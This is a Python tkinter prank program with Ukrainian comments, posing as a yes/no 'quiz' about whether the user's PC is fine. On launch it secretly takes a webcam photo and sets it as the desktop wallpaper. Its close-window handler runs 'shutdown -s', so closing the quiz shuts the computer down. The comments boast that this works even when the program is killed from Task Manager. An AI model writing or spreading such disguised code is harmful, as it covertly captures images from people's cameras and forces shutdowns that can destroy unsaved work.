from http import server
from tkinter import *
from tkinter import messagebox
import os
import cv2
import struct
import ctypes


def crash():
    os.system('shutdown -s') # функція яка виключає пк :)

def on_close():
    if messagebox.showinfo(crash()):# при нажатті на закриття програми викликається функція краш
        crash() # При таких параметрах навіть якщо закрити программу через диспетчр задач комп виключиться

def b1_window(): #функція 1 кнопки
    new_window_1 = Toplevel(tk) # відкриття нового вікна
    new_window_1.title("🤡")
    new_window_1.resizable(0, 0)
    new_window_1.wm_attributes("-topmost", 1)
    canvas_1 = Canvas(new_window_1, width = 300, height = 200, bg = "black", highlightthickness = 0)
    canvas_1.pack()
    label_1 = Label(new_window_1, text = "не вгадав)", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))
    label_1.place(x = 50, y = 50)

def b2_window(): # Функція 2 кнопки
    new_window_2 = Toplevel(tk) # відкриття нового вікна
    new_window_2.title("🤡")
    new_window_2.resizable(0, 0)
    new_window_2.wm_attributes("-topmost", 1)
    canvas_2 = Canvas(new_window_2, width = 300, height = 200, bg = "black", highlightthickness = 0)
    canvas_2.pack()
    label_2 = Label(new_window_2, text = "ага))", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))
    label_2.place(x = 0, y = 50)

tk = Tk()

tk.protocol('WM_DELETE_WINDOW', on_close) #При нажимані на хрестик спрацьовує функція on_close
tk.title("Вікторина") # Назва основного вікна
tk.resizable(0, 0) #Не можливо змінити розміри вікна
tk.wm_attributes("-topmost", 1) # вікно яке відкриється буде поверх всіх остальних вікон

# Знімок з камери
try:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite("image1.png", frame)
    cap.release()

    PATH = "image1.png"
    SPI_SETDESKWALLPAPER = 20

    def is_64bit_windows():
        """Check if 64 bit Windows OS"""
        return struct.calcsize('P') * 8 == 64

    def changeBG(path):
        """Change background depending on bit size"""
        if is_64bit_windows():
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, PATH, 3)
        else:
            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, PATH, 3)

    changeBG(PATH)

except:
    pass

canvas = Canvas(tk, width = 600, height = 400, bg = "black", highlightthickness = 0)# Основне вікно і його стилі
canvas.pack()

label = Label(tk, text = "З твоїм пк все ок?", bg = "black", fg = "white", font = ("Times New Roman", 30, "bold"))# заголовок
label.place(x = 125, y = 150)

b1 = Button(tk, text = "          так         ", font = ("Times New Roman", 15, "bold"), command = b1_window)# Кнопка 1 зі стилями
b1.place(x = 100, y = 300)

b2 = Button(tk, text = "         ні         ", font = ("Times New Roman", 15, "bold"), command = b2_window)# 2 кнопка
b2.place(x = 400, y = 300)

tk.mainloop()